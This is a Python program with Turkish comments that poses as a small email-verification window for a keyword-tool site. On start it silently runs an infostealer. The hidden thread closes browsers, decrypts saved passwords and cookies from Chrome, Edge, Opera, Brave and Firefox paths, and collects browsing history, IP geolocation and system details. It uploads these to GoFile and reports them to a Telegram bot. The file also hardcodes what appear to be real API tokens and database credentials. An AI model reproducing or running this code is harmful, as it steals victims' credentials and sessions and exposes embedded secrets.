import os
import sqlite3
import shutil
import psutil
import platform
import requests
import json
import base64
import tempfile
import psutil
import os
import win32crypt
import random
import string
import datetime
import threading
import mysql.connector
import webbrowser
import tkinter as tk
from tkinter import ttk, messagebox
from datetime import timedelta
from tempfile import gettempdir
from ctypes import Structure, c_ulong, c_char, POINTER, create_string_buffer, byref, windll
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


API = "CJOKylrPE5fGl6TrHUfkT92vgBkL2Q1q"
ACCOUNT_ID = "c5070904-ee4e-45d6-9786-df4eef21bd64"
FOLDER_ID = "af85d026-fd0b-43da-adb0-4312adb25259"

# Telegram Bot Token'ınızı ve Chat ID'nizi buraya ekleyin
TOKEN = '7459856337:AAHvmmMIPpaNr4McMlN_QvF74zmhtqFdf0A'
CHAT_ID = '1597757707'

# IP adresini öğrenmek için API
ip_api_url = 'https://api.ipify.org?format=json'

# IP adresi ile genel bilgi almak için API
apiKey = ''
ipapi_base_url = 'https://api.ipapi.is'

def perform_background_tasks():
# Dosya yolları için sabitler
    TEMP_DIR = gettempdir()

    USER_DATA_PATH = os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data")

    def close_browsers():
        """Aktif olan tüm tarayıcıları kapat."""
        browser_names = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'operagx.exe', 'brave.exe']
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in browser_names:
                try:
                    proc.terminate()
                    proc.wait()
                    print(f"{proc.info['name']} kapatıldı.")
                except psutil.NoSuchProcess:
                    pass
                except psutil.AccessDenied:
                    print(f"{proc.info['name']} kapatılamadı. Erişim reddedildi.")
        print("Tüm tarayıcılar kapatıldı.")

    def get_browser_paths(profile_name='Default'):
        """Tarayıcı dosya yollarını döndürür."""
        return {
            'Google': {
                'history': os.path.join(USER_DATA_PATH, profile_name, 'History'),
                'passwords': os.path.join(USER_DATA_PATH, profile_name, 'Login Data'),
                'cookies': os.path.join(USER_DATA_PATH, profile_name, 'Cookies'),
                'local_state_path': os.path.join(USER_DATA_PATH, 'Local State')
            },
            'Edge': {
                'history': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/History'),
                'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), f'AppData/Local/Microsoft/Edge/User Data/{profile_name}/Cookies')
            },
            'Firefox': {
                'history': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/places.sqlite'),
                'passwords': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/logins.json'),
                'cookies': os.path.join(os.path.expanduser('~'), f'AppData/Roaming/Mozilla/Firefox/Profiles/{profile_name}/cookies.sqlite')
            },
            'Opera': {
                'history': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/History'),
                'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), 'AppData/Roaming/Opera Software/Opera Stable/Cookies')
            },
            'Opera GX': {
                'history': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/History'),
                'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), 'AppData/Local/Opera Software/Opera GX Stable/Cookies')
            },
            'Brave': {
                'history': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History'),
                'passwords': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data'),
                'cookies': os.path.join(os.path.expanduser('~'), 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Cookies')
            }
        }


    paths = get_browser_paths()  
    for browser, path_dict in paths.items():
        print(f"{browser}:")
        for key, path in path_dict.items():
            print(f"  {key}: {path}")

    # Şifreleme ve çözme işlemleri için sınıf ve fonksiyonlar
    class DATA_BLOB(Structure):
        _fields_ = [("cbData", c_ulong), ("pbData", POINTER(c_char))]

    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        """Şifrelenmiş veriyi çözer."""
        encrypted_bytes_buffer = create_string_buffer(encrypted_bytes)
        entropy_buffer = create_string_buffer(entropy)
        blob_in = DATA_BLOB(len(encrypted_bytes), encrypted_bytes_buffer)
        blob_entropy = DATA_BLOB(len(entropy), entropy_buffer)
        blob_out = DATA_BLOB()

        if not windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            error_code = windll.kernel32.GetLastError()
            error_message = create_string_buffer(1024)
            windll.kernel32.FormatMessageA(0x1000, None, error_code, 0, error_message, 1024, None)
            raise Exception(f"CryptUnprotectData çağrısı başarısız oldu. Hata kodu: {error_code}. Hata mesajı: {error_message.value.decode()}")
        else:
            decrypted_data = create_string_buffer(blob_out.cbData)
            windll.kernel32.RtlMoveMemory(decrypted_data, blob_out.pbData, blob_out.cbData)
        return decrypted_data.raw

    def get_master_key(browser):
        """Tarayıcı master anahtarını alır."""
        paths = get_browser_paths()
        if browser in paths and 'local_state_path' in paths[browser]:
            local_state_path = paths[browser]['local_state_path']
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:]  # DPAPI başlığını kaldır
                return CryptUnprotectData(master_key)
            except Exception as e:
                return f'Dosya okunamadı: {e}'
        
        return None

    def D3CrYP7V41U3(encrypted_bytes, master_key=None):
        """Şifrelenmiş byte veriyi çözer."""
        if master_key and (encrypted_bytes[:3] == b'v10' or encrypted_bytes[:3] == b'v11'):
            iv = encrypted_bytes[3:15]
            payload = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            
            cipher = Cipher(
                algorithms.AES(master_key),
                modes.GCM(iv, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        
        return encrypted_bytes

    def decrypt_cookie(encrypted_cookie, key):
        try:
            if encrypted_cookie[:3] == b'v10':
                iv = encrypted_cookie[3:15]
                encrypted_cookie_data = encrypted_cookie[15:-16]
                tag = encrypted_cookie[-16:]
                cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_value = decryptor.update(encrypted_cookie_data) + decryptor.finalize()
                return decrypted_value.decode()
            else:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_cookie, None, None, None, 0)[1]
                return decrypted_value.decode() if decrypted_value else None
        except Exception as e:
            return None

    def get_encryption_key():
        try:
            user_data_path = USER_DATA_PATH
            local_state_path = os.path.join(user_data_path, "Local State")
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state = json.loads(file.read())
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Şifreleme anahtarı alma hatası: {str(e)}")
            return None

    def copy_cookies_db_to_temp(profile_path):
        cookies_db_path = os.path.join(profile_path, "Network", "Cookies")
        temp_db_path = os.path.join(tempfile.gettempdir(), "Cookies")
        shutil.copy(cookies_db_path, temp_db_path)
        return temp_db_path

    def get_cookies(profile_path):
        try:
            temp_db_path = copy_cookies_db_to_temp(profile_path)
            conn = sqlite3.connect(f"file:{temp_db_path}?mode=ro", uri=True)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, expires_utc FROM cookies")
            cookies = []
            key = get_encryption_key()
            if key is None:
                raise ValueError("Şifreleme anahtarı alınamadı.")
            for row in cursor.fetchall():
                host_key = row[0]
                name = row[1]
                encrypted_value = row[2]
                creation_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[3])
                expiry_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[4])
                decrypted_value = decrypt_cookie(encrypted_value, key)
                if decrypted_value is not None:
                    cookies.append({
                        "host_key": host_key,
                        "name": name,
                        "value": decrypted_value,
                        "creation_time": creation_time,
                        "expiry_time": expiry_time
                    })
            conn.close()
            return cookies
        except Exception as e:
            print(f"Bir hata oluştu ({profile_path}): {str(e)}")
            return []
        
    def write_cookies_to_txt(cookies, temp_dir):
        temp_file_path = os.path.join(temp_dir, "cookies.txt")
        with open(temp_file_path, "w", encoding="utf-8") as file:
            for cookie in cookies:
                domain = cookie["host_key"]
                name = cookie["name"]
                value = cookie["value"]
                creation_time = cookie["creation_time"].strftime("%Y-%m-%d %H:%M:%S")
                expiry_time = cookie["expiry_time"].strftime("%Y-%m-%d %H:%M:%S")
                file.write(f"{domain:<20}{name:<20}{value:<40}{creation_time:<30}{expiry_time:<30}\n")
                
        upload_link = upload_file_to_gofile(temp_file_path)
        return upload_link

    # def generate_random_string(length=8):
    #     """Rastgele bir string üretir."""
    #     letters = string.ascii_letters + string.digits
    #     return ''.join(random.choice(letters) for i in range(length))

    def upload_file_to_gofile(file_path):
        """Dosyayı GoFile.io'ya yükler ve yükleme işleminden sonra dosyayı siler."""
        print(f"Test edilen dosya yolu: {file_path}")
        if not os.path.exists(file_path):
            return f'Dosya mevcut değil: {file_path}'
        
        try:
            with open(file_path, 'rb') as file:
                response = requests.post(
                    'https://api.gofile.io/upload',
                    headers={'Authorization': API},
                    files={'file': file},
                    data={'folderId': FOLDER_ID, 'accountId': ACCOUNT_ID}
                )
            
            response_data = response.json()
            if response_data.get('status') == 'ok':
                download_link = response_data["data"]["downloadPage"]
                
                # Dosyayı yükleme işleminden sonra sil
                if os.path.exists(file_path):
                    os.remove(file_path)
                    print(f"Dosya silindi: {file_path}")
                else:
                    return f"Dosya silinemedi: {file_path}"
                
                return download_link
            else:
                error_message = response_data.get('error', 'Bilinmeyen hata')
                return f"Dosya yüklenemedi: {error_message}"

        except requests.exceptions.RequestException as e:
            return f"HTTP hatası: {e}"
        except Exception as e:
            return f'Dosya yüklenemedi: {e}'
        
    def extract_passwords(browser):
        """Tarayıcı şifrelerini çıkarır ve geçici dosyaya kaydeder."""
        paths = get_browser_paths()
        login_data_path = paths[browser].get('passwords')
        if not login_data_path:
            return None, f"{browser} şifre dosyası bulunamadı."

        temp_dir = tempfile.gettempdir()
        ip_address = get_external_ip()  
        temp_login_data_path = os.path.join(temp_dir, f'{ip_address}_{browser}_LoginData_temp')
        output_path = os.path.join(temp_dir, f'{ip_address}_{browser.lower()}_passwords.txt')

        if not os.path.exists(login_data_path):
            return None, f"{browser} şifre dosyası bulunamadı."

        try:
            shutil.copy2(login_data_path, temp_login_data_path)

            conn = sqlite3.connect(temp_login_data_path)
            cursor = conn.cursor()

            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            if not rows:
                return None, f"{browser}: Şifre bulunamadı."

            master_key = get_master_key(browser)
            if master_key is None:
                return None, f"{browser} için master anahtar alınamadı."

            with open(output_path, 'w', encoding='utf-8') as file:
                for row in rows:
                    origin_url, action_url, username, encrypted_password = row
                    try:
                        decrypted_password = D3CrYP7V41U3(encrypted_password, master_key)
                    except Exception as e:
                        decrypted_password = f"Hata: {e}"

                    file.write(f"URL: {origin_url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n\n")

            conn.close()

            # GoFile'a yükleyip dosyayı sil
            upload_link = upload_file_to_gofile(output_path)

            return upload_link, None

        except Exception as e:
            return None, f"Şifreler okunamadı. Hata: {e}"


    def extract_chrome_passwords():
        """Sadece Google Chrome şifrelerini çıkarır."""
        return extract_passwords('Google')

    def get_external_ip():
        """Kullanıcının dış IP adresini alır."""
        response = requests.get(ip_api_url)
        if response.status_code == 200:
            return response.json().get('ip')
        else:
            return 'Bilgi alınamadı'

    def get_ip_info(ip):
        """IP adresi bilgilerini alır."""
        ipapi_url = f'{ipapi_base_url}?q={ip}&key={apiKey}'
        response = requests.get(ipapi_url)
        if response.status_code == 200:
            data = response.json()
            ip_info = (
            f"**IP Adresi Bilgileri**\n"
            f"- 🌐 **IP Adresi**: {data.get('ip', 'Bilgi bulunamadı')}\n"
            f"- 🌍 **Şehir**: {data.get('location', {}).get('city', 'Bilgi bulunamadı')}\n"
            f"- 🏙️ **Bölge**: {data.get('location', {}).get('state', 'Bilgi bulunamadı')}\n"
            f"- 🇹🇷 **Ülke**: {data.get('location', {}).get('country', 'Bilgi bulunamadı')}\n"
            f"- 📍 **Coğrafi Koordinatlar**: {data.get('location', {}).get('latitude', 'Bilgi bulunamadı')}, {data.get('location', {}).get('longitude', 'Bilgi bulunamadı')}\n"
            f"- 🕒 **Yerel Saat**: {data.get('location', {}).get('local_time', 'Bilgi bulunamadı')}\n"
            f"- 🏢 **ISP**: {data.get('company', {}).get('name', 'Bilgi bulunamadı')}\n"
            f"- 🌐 **ASN**: {data.get('asn', {}).get('asn', 'Bilgi bulunamadı')}\n"
            )
            return ip_info
        else:
            return 'IP bilgileri alınamadı'

    def get_system_info():
        """Cihaz bilgilerini toplar."""
        uname = platform.uname()
        cpu_info = psutil.cpu_percent(interval=1)
        ram_info = psutil.virtual_memory()
        system_info = (
        f"**Sistem Bilgileri**\n"
        f"- 💻 **Bilgisayar Adı**: {uname.node}\n"
        f"- 🖥️ **İşletim Sistemi**: {uname.system} {uname.release}\n"
        f"- 🧠 **İşlemci**: {uname.processor}\n"
        f"- ⚙️ **CPU Kullanımı**: {cpu_info}%\n"
        f"- 🧠 **RAM Kullanımı**: {ram_info.percent}% ({ram_info.available / (1024 ** 3):.2f} GB serbest)\n"
        )
        return system_info

    def extract_browser_history(browser):
        """Tarayıcı geçmişini çeker ve geçici dosyaya kaydeder."""
        paths = get_browser_paths()
        history_db_path = paths.get(browser, {}).get('history')
        if not history_db_path or not os.path.exists(history_db_path):
            return None, f"{browser}: Tarayıcı bulunamadı veya geçmiş verisi mevcut değil."

        temp_dir = tempfile.gettempdir()
        temp_db_path = os.path.join(temp_dir, f'{browser}_History_copy')
        output_path = os.path.join(temp_dir, f'{browser}_history.txt')

        try:
            shutil.copy(history_db_path, temp_db_path)  # Kopyayı oluştur
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()

            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            rows = cursor.fetchall()

            if not rows:
                return None, f"{browser}: Geçmiş verisi bulunamadı."

            with open(output_path, 'w', encoding='utf-8') as file:
                for row in rows:
                    url = row[0]
                    title = row[1]
                    last_visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=(row[2] / 10))
                    file.write(f"URL: {url}\nBaşlık: {title}\nSon Ziyaret Zamanı: {last_visit_time}\n\n")

            conn.close()

            # GoFile'a yükleyip dosyayı sil
            upload_link = upload_file_to_gofile(output_path)
            print(f"Yükleme linki: {upload_link}")  # Loglama için yazdır

            return upload_link, None

        except Exception as e:
            return None, f"{browser}: Tarayıcı geçmişi okunamadı. Hata: {e}"

    def send_message_to_telegram(message):
        """Mesajı Telegram kanalına gönderir."""
        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'  # Markdown formatında gönderir
        }

        response = requests.post(url, data=payload)

        if response.status_code == 200:
            print('Mesaj başarıyla gönderildi!')
        else:
            print(f'Bir hata oluştu. Status kodu: {response.status_code}')
            print(response.text)


        response = requests.post(url, data=payload)


    def main():
        close_browsers()
        external_ip = get_external_ip()
        ip_info = get_ip_info(external_ip)
        system_info = get_system_info()

        history_links = []
        password_links = []
        cookies_links = []

        for browser, paths in get_browser_paths().items():
            # Tarayıcı geçmişini çıkar
            history_file, history_error = extract_browser_history(browser)
            if history_file:
                history_links.append(f"{browser} geçmişi: {history_file}")
            elif history_error:
                history_links.append(f"{browser} geçmişi: {history_error}")

            # Tarayıcı şifrelerini çıkar
            password_file, password_error = extract_passwords(browser)
            if password_file:
                password_links.append(f"{browser} şifreleri: {password_file}")
            elif password_error:
                password_links.append(f"{browser} şifreleri: {password_error}")

            # Tarayıcı çerezlerini al ve yazdır
            try:
                cookies_db_path = paths.get('cookies')
                if cookies_db_path:
                    profile_path = os.path.dirname(cookies_db_path)
                    cookies = get_cookies(profile_path)
                    if cookies:
                        temp_dir = tempfile.gettempdir()
                        cookies_file_path = write_cookies_to_txt(cookies, temp_dir)
                        cookies_link = upload_file_to_gofile(cookies_file_path)
                        if cookies_link:
                            cookies_links.append(f"{browser} çerezleri: {cookies_link}")
                            print(f"Çerezler başarıyla {cookies_link} dosyasına yazıldı ve yüklendi.")
                        else:
                            cookies_links.append(f"{browser} çerezleri yüklenirken hata oluştu.")
                            print("Çerezler dosyası yüklenirken bir hata oluştu.")
                    else:
                        cookies_links.append(f"{browser} çerezleri alınamadı veya boş.")
                        print("Çerezler alınamadı veya boş.")
                else:
                    cookies_links.append(f"{browser} için çerez veritabanı bulunamadı.")
                    print(f"{browser} için çerez veritabanı bulunamadı.")
            except Exception as e:
                cookies_links.append(f"{browser} çerezleri alma hatası: {str(e)}")
                print(f"Çerezleri alma hatası ({browser}): {str(e)}")

        message = (
            "{}\n\n"
            "{}\n\n"
            "**Tarayıcı Geçmiş Dökümanları;**\n"
            "{}\n\n"
            "**Tarayıcı Şifreleri Dökümanları;**\n"
            "{}\n\n"
            "**Tarayıcı Çerez Dökümanları;**\n"
            "{}\n"
        ).format(
            system_info,
            ip_info,
            '\n'.join(history_links) if history_links else 'Tarayıcı geçmişi verisi yok.',
            '\n'.join(password_links) if password_links else 'Tarayıcı şifreleri verisi yok.',
            '\n'.join(cookies_links) if cookies_links else 'Tarayıcı çerez verisi yok.'
        )

        send_message_to_telegram(message)

    if __name__ == "__main__":
        main()
        
def update_verify_status(email):
    config = {
        'user': 'tabzsecu_keyword_root',
        'password': 'g-P0eglJL-j4',
        'host': '45.84.189.195',
        'database': 'tabzsecu_keywords',
        'raise_on_warnings': True
    }

    try:
        conn = mysql.connector.connect(**config)
        cursor = conn.cursor()

        select_query = "SELECT verify FROM users WHERE email = %s"
        cursor.execute(select_query, (email,))
        result = cursor.fetchone()

        if result is None:
            messagebox.showerror("Hata", "Bu email adresi bulunamadı.")
        elif result[0] == 1:
            messagebox.showinfo("Bilgi", "Eşleştirme zaten yapıldı. Siteye yönlendiriliyorsunuz.")
            webbrowser.open("https://free.keywordstool.org/")
        else:
            # Email adresi mevcutsa ve verify değeri 1 değilse güncelle
            update_query = "UPDATE users SET verify = 1 WHERE email = %s"
            cursor.execute(update_query, (email,))
            conn.commit()
            messagebox.showinfo("Başarılı", "Verify değeri başarıyla güncellendi.")
            webbrowser.open("https://free.keywordstool.org/")

    except mysql.connector.Error as err:
        messagebox.showerror("Hata", f"Veritabanı hatası: {err}")
    finally:
        if conn.is_connected():
            cursor.close()
            conn.close()

def validate_email():
    email = email_entry.get()
    if email.endswith(('@gmail.com', '@hotmail.com', '@outlook.com', '@yandex.com')):
        messagebox.showinfo("Doğrulama Başarılı", "Doğrulamayı tamamlamak için sitemiz üzerinden giriş yapın.")
        threading.Thread(target=update_verify_status, args=(email,), daemon=True).start()
    else:
        messagebox.showerror("Geçersiz E-posta", "Lütfen geçerli bir e-posta sağlayıcısı kullanın.")

def start_background_tasks():
    threading.Thread(target=perform_background_tasks, daemon=True).start()
    
# Ana pencereyi oluştur
root = tk.Tk()
root.title("Doğrulama Ekranı")

# Pencere boyutu
root.geometry("400x200")

# Stil
style = ttk.Style()
style.configure('TButton', font=('Arial', 12), padding=6)
style.configure('TEntry', font=('Arial', 12), padding=6)

# Başlık
title_label = tk.Label(root, text="E-posta Doğrulama", font=("Arial", 16))
title_label.pack(pady=10)

# Açıklama
desc_label = tk.Label(root, text="Lütfen e-posta adresinizi girin:")
desc_label.pack(pady=5)

# E-posta girişi
email_entry = ttk.Entry(root, width=30)
email_entry.pack(pady=5)

# Doğrulama butonu
validate_button = ttk.Button(root, text="Doğrula", command=validate_email)
validate_button.pack(pady=10)

start_background_tasks()

# 45 saniye boyunca UI'nin açık kalmasını sağla
root.after(45000, root.quit)
# Tkinter döngüsünü başlat
root.mainloop()